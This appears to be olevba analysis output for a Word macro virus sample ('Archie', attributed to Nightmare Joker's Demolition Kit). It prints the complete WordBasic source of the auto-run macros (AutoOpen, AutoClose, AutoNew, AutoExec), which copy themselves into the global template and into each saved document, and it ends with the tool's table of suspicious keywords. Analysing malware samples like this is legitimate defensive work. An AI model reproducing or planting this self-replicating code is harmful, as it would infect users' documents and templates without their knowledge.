olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nj-wmdlk1.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nj-wmdlk1.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Nj-wmdlk1.d - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim VInstalled
On Error GoTo -1: On Error GoTo Finish

For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 1) = "Archie" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
    WordBasic.MacroCopy "Global:Archie", WordBasic.[FileName$]() + ":Archie"
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
    WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
    WordBasic.FileSaveAll 1, 0
End If

Finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nj-wmdlk1.d - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim VInstalled
On Error GoTo -1: On Error GoTo Finish2

For i = 1 To WordBasic.CountMacros(0, 0)
    If WordBasic.[MacroName$](i, 0, 0) = "Archie" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":Archie", "Global:Archie"
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExec", "Global:AutoExec", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", 1
End If

Finish2:
On Error GoTo -1: On Error GoTo Finish

For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 1) = "Archie" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":Archie", "Global:Archie"
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExec", "Global:AutoExec", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", 1
    WordBasic.FileSaveAll 1, 0
End If

Finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Nj-wmdlk1.d - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()

WordBasic.Call "AutoOpen"

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.Nj-wmdlk1.d - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim VInstalled
Rem On Error Goto Finish

For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 1) = "Archie" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
    WordBasic.MacroCopy "Global:Archie", WordBasic.[FileName$]() + ":Archie"
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
    WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
    WordBasic.FileSaveAll 1, 0
End If

Finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Archie.bas 
in file: Virus.MSWord.Nj-wmdlk1.d - OLE stream: 'Macros/VBA/Archie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()

Rem A Virus from Nightmare Joker's Demolition Kit!
Rem Translated into English by Dark Night (VBB)

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

